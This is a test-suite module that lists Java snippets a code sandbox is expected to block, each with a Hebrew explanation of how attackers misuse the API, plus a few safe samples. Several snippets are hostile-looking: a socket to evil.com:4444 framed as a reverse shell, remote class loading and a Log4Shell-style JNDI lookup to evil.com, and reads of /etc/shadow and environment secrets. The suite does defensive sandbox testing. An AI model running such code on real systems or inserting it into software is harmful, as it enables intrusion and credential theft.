/**
 * Java Security Attack Vectors
 * 
 * Java has strong security features but can still be exploited through
 * Runtime execution, reflection, class loading, and serialization.
 * 
 * Each test includes:
 * - name: Test identifier
 * - code: The malicious code attempt
 * - expectBlocked: Whether this should be blocked (true) or allowed (false)
 * - category: Attack category for grouping
 * - explanation: Human-readable description of how hackers use this attack
 */

export const javaTests = [
  // ════════════════════════════════════════════════════════════════
  // RUNTIME EXECUTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Runtime.exec',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    Runtime.getRuntime().exec("whoami");
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודות מערכת דרך Runtime

      איך האקרים משתמשים בזה:
      Runtime.exec() היא הדרך המרכזית ב-Java להריץ פקודות מערכת.
      היא יוצרת תהליך native שמריץ את הפקודה שהוגדרה.

      השפעה בעולם האמיתי:
      - הרצת כל פקודת shell
      - הורדה והרצה של נוזקה
      - יצירת reverse shells
      - הוצאת מידע מהמערכת החוצה

      הערה היסטורית:
      זהו אחד מנתיבי ה-RCE הנפוצים ביותר ב-Java,
      והוא הופיע באינספור CVEs, כולל שרשראות ניצול של
      Struts2, Log4Shell ועוד רבות אחרות.
    `,
  },
  {
    name: 'Java: ProcessBuilder',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("ls", "-la");
    pb.start();
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הרצת פקודות דרך ProcessBuilder

      איך האקרים משתמשים בזה:
      ProcessBuilder נותן יותר שליטה על יצירת תהליכים מאשר Runtime.exec().
      הוא מאפשר להגדיר משתני סביבה, תיקיית עבודה והפניית קלט/פלט.

      השפעה בעולם האמיתי:
      - חזק וגמיש יותר מ-Runtime.exec()
      - שליטה במשתני סביבה
      - הפניית stdin/stdout לטובת shells אינטראקטיביים
      - שרשור והרכבה של פקודות
    `,
  },
  {
    name: 'Java: ProcessBuilder with commands',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    new ProcessBuilder().command("cat", "/etc/passwd").start();
  }
}`,
    expectBlocked: true,
    category: 'command_execution',
    explanation: `
      🎯 התקפה: הגדרת פקודה דרך ProcessBuilder.command

      איך האקרים משתמשים בזה:
      המתודה command() מגדירה איזו פקודה תרוץ.
      לרוב משתמשים בה יחד עם start() כדי ליצור תהליך חדש.

      השפעה בעולם האמיתי:
      - אותו סיכון כמו ProcessBuilder דרך constructor
      - נוח יותר לקריאה בפקודות מורכבות
      - נפוץ בניצולים אמיתיים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // FILE SYSTEM ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: FileInputStream',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileInputStream fis = new FileInputStream("/etc/passwd");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: קריאת קבצים דרך FileInputStream

      איך האקרים משתמשים בזה:
      FileInputStream מספק גישה ישירה לקבצים.
      משתמשים בו כדי לקרוא קבצים רגישים כמו הגדרות וסיסמאות.

      השפעה בעולם האמיתי:
      - קריאת /etc/passwd או /etc/shadow
      - גישה לקבצי קונפיגורציה של האפליקציה
      - גניבת מפתחות פרטיים ותעודות
      - קריאת קבצי סביבה
    `,
  },
  {
    name: 'Java: FileOutputStream',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileOutputStream fos = new FileOutputStream("/tmp/evil.sh");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: כתיבת קבצים דרך FileOutputStream

      איך האקרים משתמשים בזה:
      FileOutputStream יוצר או דורס קבצים.
      משתמשים בו כדי לשתול backdoors או לשנות קבצי הגדרה.

      השפעה בעולם האמיתי:
      - כתיבת סקריפטים זדוניים
      - יצירת web shells
      - שינוי קוד האפליקציה
      - שתילת מפתחות SSH לצורך התמדה
    `,
  },
  {
    name: 'Java: FileReader',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileReader fr = new FileReader("/etc/passwd");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: קריאת קבצים מבוססת תווים

      איך האקרים משתמשים בזה:
      FileReader הוא כלי נוח לקריאת קבצי טקסט.
      בפועל יש לו אותן יכולות גישה לקבצים כמו FileInputStream.

      השפעה בעולם האמיתי:
      - קריאת קבצי הגדרה טקסטואליים
      - חלופה ל-FileInputStream
      - מתאים יותר למידע טקסטואלי
    `,
  },
  {
    name: 'Java: FileWriter',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    FileWriter fw = new FileWriter("/tmp/malware.txt");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: כתיבת קבצים מבוססת תווים

      איך האקרים משתמשים בזה:
      FileWriter מאפשר כתיבה לקבצי טקסט.
      הוא מספק יכולות יצירת קבצים דומות ל-FileOutputStream.

      השפעה בעולם האמיתי:
      - כתיבת קבצי קונפיגורציה
      - יצירת קבצי סקריפט
      - חלופה ל-FileOutputStream עבור טקסט
    `,
  },
  {
    name: 'Java: RandomAccessFile',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    RandomAccessFile raf = new RandomAccessFile("/etc/passwd", "r");
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: פעולות קובץ בגישה אקראית

      איך האקרים משתמשים בזה:
      RandomAccessFile מאפשר לקרוא ולכתוב בכל מיקום בתוך קובץ.
      זה שימושי לשינוי חלקים ספציפיים בקבצים.

      השפעה בעולם האמיתי:
      - קריאת מקטעים מסוימים מתוך קבצים
      - תיקון או שינוי binaries וקבצי הגדרה
      - הוספה לקבצי log
    `,
  },
  {
    name: 'Java: Files.readAllBytes',
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    byte[] data = Files.readAllBytes(Paths.get("/etc/passwd"));
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: קריאת קבצים דרך NIO Files

      איך האקרים משתמשים בזה:
      java.nio.file.Files מספק פעולות קובץ מודרניות.
      readAllBytes() הוא one-liner נוח לגניבת תוכן קובץ מלא.

      השפעה בעולם האמיתי:
      - חלופה מודרנית ל-FileInputStream
      - קבלת כל תוכן הקובץ בקריאה אחת
      - קל להוציא את המידע החוצה
    `,
  },
  {
    name: 'Java: Files.write',
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Files.write(Paths.get("/tmp/evil.txt"), "malicious".getBytes());
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: כתיבת קבצים דרך NIO Files

      איך האקרים משתמשים בזה:
      Files.write() יוצר או דורס קבצים עם התוכן שניתן לו.
      זהו API מודרני וקצר ליצירת קבצים.

      השפעה בעולם האמיתי:
      - יצירת קבצים מהירה
      - פריסת backdoor בקלות
      - שימוש ב-NIO API מודרני
    `,
  },
  {
    name: 'Java: Files.newInputStream',
    code: `import java.nio.file.*;
public class Main {
  public static void main(String[] args) throws Exception {
    var is = Files.newInputStream(Paths.get("/etc/shadow"));
  }
}`,
    expectBlocked: true,
    category: 'file_system',
    explanation: `
      🎯 התקפה: יצירת InputStream דרך NIO

      איך האקרים משתמשים בזה:
      Files.newInputStream() יוצר InputStream עבור נתיבי NIO.
      הוא מחבר בין טיפול מודרני בנתיבים לבין מנגנוני I/O מסורתיים.

      השפעה בעולם האמיתי:
      - גישה לקבצים מוגבלים
      - עבודה עם נתיבי NIO
      - עיבוד מבוסס stream
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NETWORK ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Socket connection',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Socket s = new Socket("evil.com", 4444);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: חיבור Socket גולמי / Reverse Shell

      איך האקרים משתמשים בזה:
      Sockets ב-Java מאפשרים פתיחת חיבורי רשת.
      זו אחת הדרכים המרכזיות לבנות reverse shell ב-Java.

      השפעה בעולם האמיתי:
      - חיבורי reverse shell
      - הוצאת מידע החוצה
      - תקשורת מול שרת C2
      - סריקת פורטים

      תבנית קלאסית:
      Socket → הפניית I/O → Runtime.exec("/bin/sh")
    `,
  },
  {
    name: 'Java: ServerSocket',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    ServerSocket ss = new ServerSocket(9999);
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: Bind Shell / Listener

      איך האקרים משתמשים בזה:
      ServerSocket פותח פורט שמאזין לחיבורים.
      משתמשים בו ל-bind shells, שבהם התוקף מתחבר אל הקורבן.

      השפעה בעולם האמיתי:
      - backdoors מסוג bind shell
      - יצירת שירות פנימי לא מורשה
      - נקודות proxy או tunnel
    `,
  },
  {
    name: 'Java: URL connection',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    URL url = new URL("https://evil.com/payload");
    url.openConnection();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: גישה לרשת דרך URL

      איך האקרים משתמשים בזה:
      המחלקה URL מספקת פעולות URL ברמה גבוהה.
      אפשר להשתמש בה כדי להביא תוכן מרוחק או להוציא מידע החוצה.

      השפעה בעולם האמיתי:
      - הורדת payloads זדוניים
      - הוצאת מידע דרך HTTP
      - מתקפות SSRF
    `,
  },
  {
    name: 'Java: HttpClient',
    code: `import java.net.http.*;
import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    HttpClient client = HttpClient.newHttpClient();
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: לקוח HTTP מודרני

      איך האקרים משתמשים בזה:
      java.net.http.HttpClient הוא API ה-HTTP המודרני של Java 11+.
      הוא מספק דרך נקייה ונוחה לשליחת בקשות HTTP.

      השפעה בעולם האמיתי:
      - הוצאת מידע החוצה בצורה מודרנית
      - תקשורת HTTP נקייה
      - יכולות בקשות אסינכרוניות
    `,
  },
  {
    name: 'Java: URLClassLoader remote',
    code: `import java.net.*;
public class Main {
  public static void main(String[] args) throws Exception {
    URLClassLoader cl = new URLClassLoader(new URL[]{new URL("http://evil.com/")});
  }
}`,
    expectBlocked: true,
    category: 'network',
    explanation: `
      🎯 התקפה: טעינת מחלקות מרחוק

      איך האקרים משתמשים בזה:
      URLClassLoader יכול לטעון מחלקות מכתובות URL מרוחקות.
      כך ניתן להוריד ולהריץ קוד שסופק על ידי התוקף.

      השפעה בעולם האמיתי:
      - הורדה והרצה של מחלקות Java מרוחקות
      - טכניקת RCE קלאסית
      - עקיפת code review, כי הקוד מגיע מרחוק
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // REFLECTION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Reflection invoke',
    code: `import java.lang.reflect.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Method m = Runtime.class.getMethod("exec", String.class);
    m.invoke(Runtime.getRuntime(), "id");
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: הרצת פקודות דרך Reflection

      איך האקרים משתמשים בזה:
      Reflection מאפשר לקרוא למתודות באופן דינמי לפי שם.
      כך ניתן לעקוף בדיקות ואיתור שמתבצעים בזמן קומפילציה.

      השפעה בעולם האמיתי:
      - קריאה למתודות private/protected
      - עקיפת SecurityManager
      - בניית payload דינמי
      - רכיב מרכזי בהרבה ניצולי Java
    `,
  },
  {
    name: 'Java: Class.forName loading',
    code: `public class Main {
  public static void main(String[] args) throws Exception {
    Class.forName("java.lang.Runtime").getMethod("exec", String.class);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: טעינת מחלקות דינמית

      איך האקרים משתמשים בזה:
      Class.forName() טוען מחלקות לפי שם בזמן ריצה.
      זהו הצעד הראשון בהרבה מתקפות מבוססות Reflection.

      השפעה בעולם האמיתי:
      - טעינת כל מחלקה באופן דינמי
      - הפניות מבוססות מחרוזת שעוקפות ניתוח סטטי
      - בסיס לניצולי Reflection
    `,
  },
  {
    name: 'Java: setAccessible bypass',
    code: `import java.lang.reflect.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Field f = System.class.getDeclaredField("security");
    f.setAccessible(true);
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: עקיפת בקרת גישה

      איך האקרים משתמשים בזה:
      setAccessible(true) עוקף את מנגנוני בקרת הגישה של Java.
      הוא מאפשר גישה לשדות ומתודות פרטיים.

      השפעה בעולם האמיתי:
      - גישה לשדות private
      - שינוי שדות final
      - נטרול SecurityManager
      - העלאת הרשאות
    `,
  },
  {
    name: 'Java: MethodHandles.lookup',
    code: `import java.lang.invoke.*;
public class Main {
  public static void main(String[] args) throws Exception {
    MethodHandles.Lookup lookup = MethodHandles.lookup();
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: Reflection דרך MethodHandle

      איך האקרים משתמשים בזה:
      MethodHandles הוא API מודרני ל-Reflection.
      לעיתים הוא מצליח לעקוף בדיקות אבטחה טוב יותר מ-Reflection מסורתי.

      השפעה בעולם האמיתי:
      - מנגנון Reflection חלופי
      - עשוי לעקוף SecurityManager
      - קריאה למתודות private
      - שימוש בניצולים מתקדמים
    `,
  },
  {
    name: 'Java: VarHandle',
    code: `import java.lang.invoke.*;
public class Main {
  public static void main(String[] args) throws Exception {
    VarHandle vh;
  }
}`,
    expectBlocked: true,
    category: 'reflection',
    explanation: `
      🎯 התקפה: גישה לשדות דרך VarHandle

      איך האקרים משתמשים בזה:
      VarHandle מספק גישה ישירה לשדות עם overhead נמוך.
      הוא חלופה מודרנית ל-Field reflection.

      השפעה בעולם האמיתי:
      - מניפולציה low-level בשדות
      - פעולות אטומיות על כל שדה
      - עקיפת encapsulation
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SERIALIZATION ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: ObjectInputStream',
    code: `import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(System.in);
    Object obj = ois.readObject();
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: Deserialization לא בטוח

      איך האקרים משתמשים בזה:
      ObjectInputStream.readObject() מבצע deserialization לאובייקטים של Java.
      אובייקטים זדוניים יכולים להריץ קוד בזמן תהליך ה-deserialization.

      השפעה בעולם האמיתי:
      - Remote Code Execution דרך gadget chains
      - חולשת deserialization קלאסית ב-Java
      - אלפי CVEs, כולל Apache Commons ו-WebLogic

      ניצולים מפורסמים:
      - Apache Commons Collections gadget chain
      - WebLogic T3 deserialization
      - JBoss, Jenkins ועוד רבים
    `,
  },
  {
    name: 'Java: XMLDecoder',
    code: `import java.beans.*;
import java.io.*;
public class Main {
  public static void main(String[] args) throws Exception {
    XMLDecoder decoder = new XMLDecoder(new FileInputStream("malicious.xml"));
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: XML Deserialization

      איך האקרים משתמשים בזה:
      XMLDecoder מבצע deserialization לאובייקטי Java מתוך XML.
      XML זדוני יכול ליצור אובייקטים שרירותיים.

      השפעה בעולם האמיתי:
      - RCE דרך payloads של XML
      - וקטור שלעיתים מפספסים בבדיקות אבטחה
      - CVE-2017-3506 ב-WebLogic
    `,
  },
  {
    name: 'Java: XStream',
    code: `import com.thoughtworks.xstream.*;
public class Main {
  public static void main(String[] args) {
    XStream xstream = new XStream();
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: XML Serialization דרך XStream

      איך האקרים משתמשים בזה:
      XStream היא ספריית XML serialization פופולרית.
      בעבר נמצאו בה חולשות RCE רבות.

      השפעה בעולם האמיתי:
      - מספר CVEs, למשל CVE-2020-26217 ו-CVE-2021-21344
      - נפוצה באפליקציות Java ארגוניות
      - RCE מבוסס XML
    `,
  },
  {
    name: 'Java: YAML deserialization',
    code: `import org.yaml.snakeyaml.*;
public class Main {
  public static void main(String[] args) {
    Yaml yaml = new Yaml();
    yaml.load("!!java.lang.Runtime [\"whoami\"]");
  }
}`,
    expectBlocked: true,
    category: 'serialization',
    explanation: `
      🎯 התקפה: YAML Deserialization

      איך האקרים משתמשים בזה:
      SnakeYAML יכול ליצור מחלקות שרירותיות מתוך YAML.
      התחילית !! מגדירה את סוג המחלקה שיש ליצור.

      השפעה בעולם האמיתי:
      - RCE דרך payloads של YAML
      - CVE-2022-1471 ב-SnakeYAML
      - נפוץ באפליקציות Spring
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // JNDI ATTACKS (Log4Shell style)
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: JNDI lookup',
    code: `import javax.naming.*;
public class Main {
  public static void main(String[] args) throws Exception {
    InitialContext ctx = new InitialContext();
    ctx.lookup("ldap://evil.com/exploit");
  }
}`,
    expectBlocked: true,
    category: 'jndi_injection',
    explanation: `
      🎯 התקפה: JNDI Injection בסגנון Log4Shell

      איך האקרים משתמשים בזה:
      JNDI lookup יכול לטעון אובייקטים מרוחקים משרתי LDAP/RMI.
      זהו הלב של מתקפת Log4Shell, הידועה כ-CVE-2021-44228.

      השפעה בעולם האמיתי:
      - Log4Shell נחשבת לאחת החולשות החמורות אי פעם
      - הורדה והרצה של מחלקות Java מרוחקות
      - פגיעה במיליוני שרתים

      זרימת התקפה:
      1. התוקף מזריק \${jndi:ldap://evil.com/x}
      2. שרת הקורבן מבצע lookup ל-LDAP
      3. שרת ה-LDAP מחזיר הפניה למחלקה זדונית
      4. המחלקה נטענת ומורצת
    `,
  },
  {
    name: 'Java: InitialContext',
    code: `import javax.naming.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Context ctx = new InitialContext();
  }
}`,
    expectBlocked: true,
    category: 'jndi_injection',
    explanation: `
      🎯 התקפה: יצירת JNDI Context

      איך האקרים משתמשים בזה:
      InitialContext הוא שער הכניסה לפעולות JNDI.
      הוא נדרש כדי לבצע מתקפות מבוססות JNDI.

      השפעה בעולם האמיתי:
      - תנאי מקדים ל-JNDI injection
      - ניתן להגדיר אותו ל-lookups מרוחקים
      - רכיב מרכזי בפונקציונליות JNDI
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SCRIPT ENGINE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: ScriptEngine eval',
    code: `import javax.script.*;
public class Main {
  public static void main(String[] args) throws Exception {
    ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    engine.eval("java.lang.Runtime.getRuntime().exec('id')");
  }
}`,
    expectBlocked: true,
    category: 'script_engine',
    explanation: `
      🎯 התקפה: הרצת פקודות דרך JavaScript Engine

      איך האקרים משתמשים בזה:
      ScriptEngine של Java יכול להריץ JavaScript.
      JavaScript כזה יכול לגשת למחלקות Java ולהריץ פקודות.

      השפעה בעולם האמיתי:
      - הרצת פקודות דרך JavaScript מוטמע
      - עקיפת בדיקות שמחפשות רק קוד Java
      - וקטור תקיפה שלעיתים מתעלמים ממנו
    `,
  },
  {
    name: 'Java: ScriptEngineManager',
    code: `import javax.script.*;
public class Main {
  public static void main(String[] args) {
    ScriptEngineManager manager = new ScriptEngineManager();
  }
}`,
    expectBlocked: true,
    category: 'script_engine',
    explanation: `
      🎯 התקפה: גישה למנועי סקריפטים

      איך האקרים משתמשים בזה:
      ScriptEngineManager מספק גישה למנועי סקריפטים.
      הוא שער כניסה להרצת JavaScript, Groovy ושפות סקריפט נוספות.

      השפעה בעולם האמיתי:
      - גישה למספר מנועי סקריפט
      - הרצת קוד בין שפות
      - עקיפה דרך scripting של מנגנוני אבטחה
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // UNSAFE MEMORY ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: sun.misc.Unsafe',
    code: `import sun.misc.Unsafe;
public class Main {
  public static void main(String[] args) throws Exception {
    java.lang.reflect.Field f = Unsafe.class.getDeclaredField("theUnsafe");
    f.setAccessible(true);
    Unsafe unsafe = (Unsafe) f.get(null);
  }
}`,
    expectBlocked: true,
    category: 'unsafe_memory',
    explanation: `
      🎯 התקפה: פעולות זיכרון לא בטוחות

      איך האקרים משתמשים בזה:
      sun.misc.Unsafe מספק גישה גולמית לזיכרון.
      הוא עוקף את מנגנוני הבטיחות של Java.

      השפעה בעולם האמיתי:
      - קריאה/כתיבה שרירותית בזיכרון
      - יצירת אובייקטים בלי constructors
      - עקיפת אבטחה בצורה מלאה
      - מתקפות memory corruption
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // CLASSLOADER ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: defineClass',
    code: `import java.lang.reflect.*;
public class Main {
  public static void main(String[] args) throws Exception {
    Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
  }
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 התקפה: הגדרת מחלקה דינמית

      איך האקרים משתמשים בזה:
      defineClass() יוצר מחלקות חדשות מתוך bytecode.
      אפשר להשתמש בו כדי להזריק מחלקות זדוניות בזמן ריצה.

      השפעה בעולם האמיתי:
      - טעינת bytecode של התוקף ישירות
      - עקיפת אימות מחלקות
      - יצירת מחלקות בלי קבצי .class
    `,
  },
  {
    name: 'Java: Custom ClassLoader',
    code: `public class Evil extends ClassLoader {
  public Class<?> loadMalicious(byte[] bytes) {
    return defineClass(null, bytes, 0, bytes.length);
  }
}
public class Main {
  public static void main(String[] args) {}
}`,
    expectBlocked: true,
    category: 'classloader',
    explanation: `
      🎯 התקפה: יצירת Custom ClassLoader

      איך האקרים משתמשים בזה:
      ירושה מ-ClassLoader מאפשרת להגדיר לוגיקת טעינת מחלקות מותאמת.
      כך ניתן לעקוף מגבלות אבטחה.

      השפעה בעולם האמיתי:
      - טעינת bytecode זדוני
      - עקיפת חתימות מחלקות
      - עקיפת אבטחה מותאמת
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SYSTEM PROPERTY ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: System.getProperty',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println(System.getProperty("user.home"));
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: חשיפת מידע דרך System Properties

      איך האקרים משתמשים בזה:
      System properties חושפים פרטי קונפיגורציה של המערכת.
      זה שימושי לשלב reconnaissance.

      השפעה בעולם האמיתי:
      - תיקיית הבית של המשתמש
      - גרסת Java ונתיבי Java
      - מידע על מערכת ההפעלה
      - קידוד ונתיבי קבצים
    `,
  },
  {
    name: 'Java: System.setProperty',
    code: `public class Main {
  public static void main(String[] args) {
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: שינוי System Properties

      איך האקרים משתמשים בזה:
      שינוי system properties יכול להפעיל התנהגויות פגיעות.
      בדוגמה, ההגדרה מאפשרת טעינת קוד מרוחק דרך JNDI.

      השפעה בעולם האמיתי:
      - הפעלת קונפיגורציות פגיעות
      - עקיפת מגבלות אבטחה
      - הפעלת מתקפות JNDI
    `,
  },
  {
    name: 'Java: System.getenv',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println(System.getenv());
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: גניבת משתני סביבה

      איך האקרים משתמשים בזה:
      System.getenv() מחזיר את כל משתני הסביבה.
      לעיתים הם מכילים credentials והגדרות רגישות.

      השפעה בעולם האמיתי:
      - מפתחות AWS
      - סיסמאות למסדי נתונים
      - API keys
      - סודות של האפליקציה
    `,
  },
  {
    name: 'Java: System.exit',
    code: `public class Main {
  public static void main(String[] args) {
    System.exit(1);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: Denial of Service

      איך האקרים משתמשים בזה:
      System.exit() מסיים את פעולת ה-JVM.
      זה גורם לשיבוש מיידי של השירות.

      השפעה בעולם האמיתי:
      - קריסת האפליקציה
      - מניעת שירות
      - פגיעה בכל המשתמשים
    `,
  },
  {
    name: 'Java: Runtime.halt',
    code: `public class Main {
  public static void main(String[] args) {
    Runtime.getRuntime().halt(1);
  }
}`,
    expectBlocked: true,
    category: 'system_access',
    explanation: `
      🎯 התקפה: עצירה מיידית של ה-JVM

      איך האקרים משתמשים בזה:
      halt() עוצר את התהליך מיד, בלי להריץ shutdown hooks.
      הוא אגרסיבי יותר מ-System.exit().

      השפעה בעולם האמיתי:
      - כיבוי מיידי
      - דילוג על קוד ניקוי וסגירה
      - סיכון לשחיתות נתונים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SECURITY MANAGER BYPASS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: SecurityManager manipulation',
    code: `public class Main {
  public static void main(String[] args) {
    System.setSecurityManager(null);
  }
}`,
    expectBlocked: true,
    category: 'security_bypass',
    explanation: `
      🎯 התקפה: הסרת SecurityManager

      איך האקרים משתמשים בזה:
      הגדרת SecurityManager ל-null מסירה את כל בדיקות האבטחה.
      כך פעולות שהיו חסומות קודם יכולות לרוץ.

      השפעה בעולם האמיתי:
      - הסרת כל מגבלות האבטחה
      - גישה מלאה למערכת
      - בריחה מלאה מ-sandbox

      הערה: SecurityManager הוגדר כ-deprecated החל מ-Java 17+
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // NATIVE CODE ATTACKS
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: System.loadLibrary',
    code: `public class Main {
  public static void main(String[] args) {
    System.loadLibrary("evil");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: טעינת ספרייה native

      איך האקרים משתמשים בזה:
      loadLibrary() טוען ספריות shared native כמו .so או .dll.
      לקוד native אין את מגבלות האבטחה של Java.

      השפעה בעולם האמיתי:
      - הרצת נוזקה native
      - עקיפת כל מנגנוני האבטחה של Java
      - גישה ישירה למערכת
    `,
  },
  {
    name: 'Java: System.load',
    code: `public class Main {
  public static void main(String[] args) {
    System.load("/tmp/evil.so");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: טעינת ספרייה native לפי נתיב

      איך האקרים משתמשים בזה:
      load() טוען ספרייה לפי נתיב מלא.
      כך אפשר לטעון ספריות זדוניות ממיקומים שבשליטת התוקף.

      השפעה בעולם האמיתי:
      - טעינת ספרייה מכל נתיב
      - בלי מגבלות של library path
      - נתיב ישיר לקובץ .so זדוני
    `,
  },
  {
    name: 'Java: Runtime.loadLibrary',
    code: `public class Main {
  public static void main(String[] args) {
    Runtime.getRuntime().loadLibrary("malicious");
  }
}`,
    expectBlocked: true,
    category: 'native_code',
    explanation: `
      🎯 התקפה: טעינת ספרייה native דרך Runtime

      איך האקרים משתמשים בזה:
      זהו API חלופי לטעינת ספריות native.
      יש לו אותן יכולות כמו System.loadLibrary().

      השפעה בעולם האמיתי:
      - אותו סיכון כמו System.loadLibrary
      - נתיב API חלופי
      - עשוי לעקוף חלק מהפילטרים
    `,
  },

  // ════════════════════════════════════════════════════════════════
  // SAFE CODE
  // ════════════════════════════════════════════════════════════════
  {
    name: 'Java: Safe print',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println("Hello, World!");
  }
}`,
    expectBlocked: false,
    expectedOutput: 'Hello, World!',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פלט בסיסי לקונסול

      זהו קוד לגיטימי שאמור לרוץ:
      System.out.println() הוא כלי בסיסי
      ללימוד Java ולדיבוג.
    `,
  },
  {
    name: 'Java: Safe math',
    code: `public class Main {
  public static void main(String[] args) {
    System.out.println(2 + 2);
  }
}`,
    expectBlocked: false,
    expectedOutput: '4',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: פעולות מתמטיות

      זהו קוד לגיטימי שאמור לרוץ:
      פעולות חשבון בסיסיות הן חלק חיוני
      מכל משימת תכנות.
    `,
  },
  {
    name: 'Java: Safe class',
    code: `class Point {
  int x, y;
  Point(int x, int y) { this.x = x; this.y = y; }
  int sum() { return x + y; }
}
public class Main {
  public static void main(String[] args) {
    Point p = new Point(3, 4);
    System.out.println(p.sum());
  }
}`,
    expectBlocked: false,
    expectedOutput: '7',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: תכנות מונחה עצמים

      זהו קוד לגיטימי שאמור לרוץ:
      הגדרת מחלקות, constructors ומתודות
      היא פונקציונליות מרכזית ב-Java.
    `,
  },
  {
    name: 'Java: Safe streams',
    code: `import java.util.Arrays;
public class Main {
  public static void main(String[] args) {
    int sum = Arrays.stream(new int[]{1, 2, 3, 4, 5}).sum();
    System.out.println(sum);
  }
}`,
    expectBlocked: false,
    expectedOutput: '15',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: Stream API

      זהו קוד לגיטימי שאמור לרוץ:
      Java Streams לעיבוד אוספים
      הם פיצ'ר מודרני ובטוח.
    `,
  },
  {
    name: 'Java: Safe lambda',
    code: `import java.util.function.*;
public class Main {
  public static void main(String[] args) {
    Function<Integer, Integer> square = x -> x * x;
    System.out.println(square.apply(5));
  }
}`,
    expectBlocked: false,
    expectedOutput: '25',
    category: 'safe_code',
    explanation: `
      ✅ בטוח: ביטויי Lambda

      זהו קוד לגיטימי שאמור לרוץ:
      Functional interfaces ו-lambdas הם
